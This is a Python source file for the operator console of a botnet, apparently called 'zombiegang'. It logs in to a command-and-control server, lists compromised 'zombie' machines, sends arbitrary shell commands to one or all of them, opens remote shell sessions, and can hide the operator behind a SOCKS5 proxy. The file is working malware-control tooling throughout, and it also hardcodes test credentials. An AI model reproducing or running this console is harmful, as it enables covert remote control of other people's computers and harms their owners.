#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n
# zombiegang console

from app import *
Config = Config

logger.debug = False
logger.start()
logger.set_level(logger.console_handler, 'INFO')

from app.modules import crud
from app.models import Task, Mission
from app.forms.regexps import validate, ValidRegex
from app.components.logger import color

import queue, threading, cmd, json
from getpass import getpass
from datetime import datetime
from time import sleep


############################################
# testing enviroment (comment in prd env) ##
############################################
zession.username = 'r3nt0n'               ##
zession.password = 'password'             ##
zession.remote_host = 'localhost:8080'    ##
############################################



class ZgangConsole(cmd.Cmd):
    def __init__(self):
        super().__init__()
        self.COLOR_WELCOME_BANNER = color.END
        self.COLOR_PROMPT = color.ORANGE
        self.COLOR_PROMPT_TAG = color.UNDERLINE
        self.COLOR_PROMPT_TAG_PREFIX = color.GREY

        self.prompt = '{}zgang{} {}>{} '.format(self.COLOR_PROMPT_TAG, color.END, self.COLOR_PROMPT,color.END)
        self.intro = "{}zombiegang 0.5.1~beta 2022 console{}".format(self.COLOR_WELCOME_BANNER, color.END)
        self.ruler = '-'

        self.doc_header = 'commands'
        self.undoc_header = 'undoc commands'
        self.misc_header = 'misc_header'

        self.env_vars = {
            'RHOST': zession.remote_host,
            'USER': zession.username,
            'PSWD': zession.password,
            'PXHOST': proxy.host,
            'PXPORT': proxy.port
        }
        self.data_types = {
            'access_log': None,  # for now just using keys, value for future uses
            'task': None,
            'mission': None,
            'master': None,
            'user': None,
            'zombie': None
        }

        self.kill = False
        self.executed_missions = queue.Queue()

        # multisession management
        self.sessions = []

    def cmdloop(self, intro=None):
        print(self.intro)
        while True:
            try:
                super(ZgangConsole, self).cmdloop(intro="")
                break
            except KeyboardInterrupt:
                print("^C")

    def update_prompt(self):
        self.prompt = '{}>{} '.format(self.COLOR_PROMPT,color.END)
        if zession.token.jwt:
            logged_prompt = '{}{}@{}{}'.format(self.COLOR_PROMPT_TAG, zession.username, zession.remote_host, color.END)
            if ('SESSION' in self.env_vars) and (len(str(self.env_vars['SESSION'])) > 0):
                logged_prompt += ' [{}]'.format(self.env_vars['SESSION'])
            self.prompt = '{} '.format(logged_prompt) + self.prompt

        if proxy.host and proxy.port:
            self.prompt = ('[{}{}:{}{}]=>({}{}{}) '.format(self.COLOR_PROMPT_TAG_PREFIX, proxy.host, proxy.port, color.END,
                                                            self.COLOR_PROMPT_TAG_PREFIX, proxy.current_ip, color.END) + self.prompt)

        elif not zession.token.jwt:
            self.prompt = '{}zgang{} '.format(self.COLOR_PROMPT_TAG, color.END) + self.prompt

    def postcmd(self, stop, line):
        # update sessions env_var
        if self.sessions:
            self.env_vars['SESSIONS'] = self.sessions
        # update prompt
        self.update_prompt()
        # print('postcmd(%s, %s)' % (stop, line))
        return cmd.Cmd.postcmd(self, stop, line)

    # def parseline(self, line):
    #     logger.log('parseline => {}'.format(line), 'DEBUG')
    #     ret = cmd.Cmd.parseline(self, line)
    #     logger.log('parseline => {}'.format(ret), 'DEBUG')
    #     return ret

    def do_set(self, line):
        """set variables - syntax: set <var> <value>"""
        input_data = line.split()

        if len(input_data) == 1:
            key = input_data[0]
            if key.upper() == 'USER':
                zession.username = self.env_vars['USER'] = ''
            if key.upper() == 'RHOST':
                zession.remote_host = self.env_vars['RHOST'] = ''
            # if key.upper() == 'ZOMBIE':
            #     self.env_vars['ZOMBIE'] = ''
            if key.upper() == 'SESSION':
                self.env_vars['SESSION'] = ''
            if key.upper() == 'PXHOST':
                self.env_vars['PXHOST'] = ''
            if key.upper() == 'PXPORT':
                self.env_vars['PXPORT'] = ''

            if key.upper() == 'PSWD':
                zession.password = getpass('[pswd] ' + self.prompt)

        if len(input_data) == 2:
            key, value = input_data
            if key.upper() == 'USER':
                zession.username = self.env_vars['USER'] = value
            if key.upper() == 'RHOST':
                zession.remote_host = self.env_vars['RHOST'] = value
            # if key.upper() == 'ZOMBIE':
            #     self.env_vars['ZOMBIE'] = value
            if key.upper() == 'SESSION':
                self.env_vars['SESSION'] = value
                if value not in self.sessions:
                    self.sessions.append(value)
            if key.upper() == 'PXHOST':
                if (validate(ValidRegex.IpAddress, value)) or (validate(ValidRegex.Hostname,value)):
                    self.env_vars['PXHOST'] = value
                else:
                    logger.log('error in "{}", not a valid ip address/hostname'.format(value), 'ERROR')
            if key.upper() == 'PXPORT':
                if validate(ValidRegex.Port, value):
                    self.env_vars['PXPORT'] = value
                else:
                    logger.log('error in "{}", not a valid port'.format(value), 'ERROR')


    def complete_set(self, text, line, begidx, endidx):
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.env_vars if s.startswith(mline)]

    def do_show(self, line):
        """show set variables - syntax: show <var> (if any var provided, shows all)"""
        input_data = line.split()
        output = {}
        params = []

        # parse parameters
        if len(input_data) > 0:
            params = list.copy(input_data)

        # filter data
        if not params:
            output = dict.copy(self.env_vars)
        else:
            for key in self.env_vars:
                for param in params:
                    if key == param.upper():
                        output[key] = self.env_vars[key]

        # show data
        print('')  # line break
        for column in output:
            logger.log("\t".join((column, (str(output[column] if ((output[column]) is not None) else '')))), 'OPTION', overindent=3)
        print('')  # line break

    def complete_show(self, text, line, begidx, endidx):
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.env_vars if s.startswith(mline)]

    def do_proxy(self, line):
        """enable/disable tunneling connection trough socks5 proxy to reach cc server"""
        if proxy.host:
            proxy.remove()
            logger.log('socks5 proxy session {}:{} removed'.format(proxy.host, proxy.port), 'INFO')
        else:
            input_host = self.env_vars['PXHOST']
            input_port = self.env_vars['PXPORT']
            # here regexp is double checked, maybe i should remove it
            if (validate(ValidRegex.IpAddress, input_host) or validate(ValidRegex.Hostname, input_host)) and validate(
                    ValidRegex.Port, input_port):
                input_host = str(input_host)
                input_port = int(input_port)
                proxy.get_socks5_session(input_host, input_port)
                print('')  # line break
                logger.log('socks5 proxy session {}:{} created'.format(proxy.host, proxy.port), 'SUCCESS')
                logger.log('current public ip: {} (cc: {})'.format(proxy.current_ip, proxy.country.upper()), 'OPTION')
                print('')  # line break
            else:
                logger.log('trying to create socks5 proxy session: regexp error in {}:{}'.format(proxy.host, proxy.port), 'ERROR')

    def do_get(self, line):
        """get data from remote cc server - syntax: get <data_type>"""
        data_rcv = []
        input_data = line.split()
        params = []

        # parse data type
        if len(input_data) > 0:
            data_type = input_data[0]
            # get info
            if len(input_data) >= 1:
                if data_type.lower() == 'zombies':
                    data_rcv = crud.read_data('zombies')
                if data_type.lower() == 'tasks':
                    data_rcv = crud.read_data('tasks')

        # parse params
        if len(input_data) > 1:
            params = input_data[1:]

        # show info
        if input_data:
            # headers
            if params:
                logger.log("\t".join([field for field in params]), 'INFO', overindent=3)
            elif data_rcv and (type(data_rcv) == list) and (len(data_rcv)>0):
                logger.log("\t".join([field for field in data_rcv[0]]), 'INFO', overindent=3)
            # data
            if data_rcv and (type(data_rcv) == list) and (len(data_rcv) > 0):
                for row in data_rcv:
                    try:
                        # show only selected columns
                        if params:
                            logger.log("\t".join([(row[field] if type(row[field]) == str else json.dumps(row[field])) for field in params]),'INFO', overindent=3)
                        # show all columns
                        else:
                            logger.log("\t".join([(row[field] if type(row[field]) == str else json.dumps(row[field])) for field in row]),'INFO', overindent=3)
                    except KeyError:
                        logger.log('wrong field name provided', 'ERROR')
                        break

    def complete_get(self, text, line, begidx, endidx):
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [(s+'s')[offs:] for s in self.data_types if (s+'s').startswith(mline)]

    def do_create(self):
        pass

    def complete_create(self, text, line, begidx, endidx):
        return self.complete_get(text, line, begidx, endidx)

    def create_cmd_task(self, zombie_id, command='echo "hello word"'):
        if command == 'exit':
            self.do_stop(zombie_id)
        if (self.env_vars['SESSION'] not in self.sessions):
            self.env_vars['SESSION'] = ''

        if len(zombie_id) > 0:
            from app.controllers import TaskController
            selected_zombie = crud.read_data('zombies', {'id': zombie_id})[0]['username']
            task_controller = TaskController('cmd')
            if task_controller.run(
                    task_data={'task_name': datetime.now().strftime('%Y-%m-%d_%H:%M:%S'),
                               'task_content': command},
                    selected_zombies=[selected_zombie]):
                self.executed_missions.put(task_controller.last_created_mission)
                logger.log('mission {} created'.format(task_controller.last_created_mission), 'DEBUG')

    def create_rsh_task(self, line, toggle='on'):
        zombie_id = line.split()
        if (len(zombie_id) != 1):
            if (self.env_vars['SESSION']):
                zombie_id = [self.env_vars['SESSION']]
            else:
                logger.log('zombie_id is required (enter ? start to see cmd syntax)', 'ERROR')
                return False

        zombie_id = zombie_id[0]
        from app.controllers import TaskController
        selected_zombie = False
        try:
            selected_zombie = crud.read_data('zombies', {'id': zombie_id})[0]['username']
        except TypeError:
            logger.log('zombie {} not found'.format(zombie_id), 'ERROR')
        if selected_zombie:
            task_controller = TaskController('rsh')
            if task_controller.run(
                    task_data={'task_name': datetime.now().strftime('%Y-%m-%d_%H:%M:%S'),
                               'task_content': toggle},
                    selected_zombies=[selected_zombie]):

                self.executed_missions.put(task_controller.last_created_mission)
                logger.log('mission {} created'.format(task_controller.last_created_mission), 'DEBUG')
                self.env_vars['SESSION'] = zombie_id
                if (toggle == 'on') and (zombie_id not in self.sessions):
                    self.sessions.append(zombie_id)
                    logger.log('waiting for zombie confirm to start session...', 'OTHER')
                else:
                    try:
                        self.sessions.remove(zombie_id)
                    except ValueError:
                        pass

            if self.env_vars['SESSION'] not in self.sessions:
                self.env_vars['SESSION'] = ''

    def do_start(self, line):
        """start a remote shell session - syntax: start <zombie_id>"""
        self.create_rsh_task(line, 'on')

    def do_stop(self, line):
        """stop a remote shell session - syntax: stop <zombie_id>"""
        self.create_rsh_task(line, 'off')

    def complete_stop(self, text, line, begidx, endidx):
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.sessions if (str(s)).startswith(mline)]

    def do_login(self, line):
        """log in to remote cc server (set USER, PSWD and RHOST before run this command)"""
        if zession.username and zession.password and zession.remote_host:
            if (
                    (validate(ValidRegex.Username, zession.username) and validate(ValidRegex.Password, zession.password)) and
                    (validate(ValidRegex.IpAddress, zession.remote_host) or validate(ValidRegex.Hostname, zession.remote_host)
                      or validate(ValidRegex.HostPort, zession.remote_host))
            ):
                if zession.login(zession.username, zession.password, zession.remote_host):
                    logger.log('logged as {} at {}'.format(zession.username, zession.remote_host), 'SUCCESS')
                    self.env_vars['SESSION'] = ''
                else:
                    logger.log('error trying to log into {}'.format(zession.remote_host), 'ERROR')
            else:
                logger.log('regexp error in {}:{} while trying to create socks5 proxy session'.format(proxy.host,proxy.port),'ERROR')
        else:
            required_fields =  {'USER': zession.username, 'PSWD': zession.password, 'RHOST': zession.remote_host}
            for field in required_fields:
                if not required_fields[field]:
                    logger.log('{} is required'.format(field), 'ERROR')

    def emptyline(self):
        pass  # overwrites default behaviour (which is execute last command)

    def default(self, line):
        command = line
        if ('SESSION' in self.env_vars):
            if (self.env_vars['SESSION'] == 'all'):
                for session_id in self.sessions:
                    self.create_cmd_task(zombie_id=session_id, command=command)
            else:
                self.create_cmd_task(zombie_id=self.env_vars['SESSION'], command=command)
        #return cmd.Cmd.default(self, line)

    def do_exit(self, line):  # param required
        """close zgang console"""
        return True


    def input_thread(self):
        logger.log('initiating input stream thread...', 'DEBUG')
        self.cmdloop()
        self.kill = True

    def output_thread(self):
        logger.log('initiating output thread...', 'DEBUG')
        while not self.kill:
            if zession.token.jwt:
                zession.check_for_refresh()

            try:
                mission = self.executed_missions.get(timeout=0.1)
                if mission is not None:
                    response = crud.read_data('missions', {'id': mission.id})
                    # ...
                    if response and (type(response) == list):

                        r = crud.read_data('tasks', {"id": mission.task_id})

                        # show message if a rsh session was started/stopped
                        if r and (type(r) == list) and ('task_type' in r[0]) and (r[0]['task_type'] == 'rsh'):
                            zombie_id = (crud.read_data('zombies', {'username': mission.zombie_username}))[0]['id']
                            action = 'stopped'
                            if ('task_content' in r[0]) and (r[0]['task_content'] == 'on'):
                                action = 'started'
                            if ('read_confirm' in response[0]) and (response[0]['read_confirm'] == 'true'):
                                # print('\r\n')
                                print('')  # line break
                                logger.log('zombie has read the update', 'OTHER')
                                if r[0]['task_content'] == 'off':
                                    mission.result = 'success'

                                if ('result' in response[0]) and (response[0]["result"] is not None) and (r[0]['task_content'] == 'on'):
                                    mission.result = response[0]["result"]
                                    secs_to_wait = float(mission.result)
                                    logger.log('starting session in {} secs...'.format(secs_to_wait), 'OTHER')
                                    sleep(secs_to_wait)
                                    print('')  # line break
                                    logger.log('session for zombie {} {}'.format(zombie_id, action), 'SUCCESS')
                                #print(self.prompt)

                        # show result for other task_types
                        elif r and (type(r) == list) and ('task_type' in r[0]) and (r[0]['task_type'] == 'cmd'):
                            mission.result = response[0]['result']

                            if mission.result is not None:
                                print('')  # line break
                                logger.log('[{}]\r\n{}'.format(self.env_vars['SESSION'], mission.result), 'INFO')

                    self.executed_missions.task_done()

                if not mission.result:
                    self.executed_missions.put(mission)

            except queue.Empty:
                pass

    def run(self):
        threads = []
        try:
            o_thread = threading.Thread(name='o_thread', target=self.output_thread)#, args=((self.self,)))
            threads.append(o_thread)
            i_thread = threading.Thread(name='i_thread', target=self.input_thread)#, args=((self.self,)))
            threads.append(i_thread)
            # Start all threads
            for t in threads:
                t.setDaemon(True)
                t.start()

        except KeyboardInterrupt:
            logger.log('manual exit requested', 'CRITICAL')

        except Exception as e:
            logger.log('CRITICAL ERROR: {}'.format(e), 'CRITICAL')

        finally:
            # Wait for all of them to finish
            for t in threads:
                t.join()


if __name__ == '__main__':
    console = ZgangConsole()
    console.run()
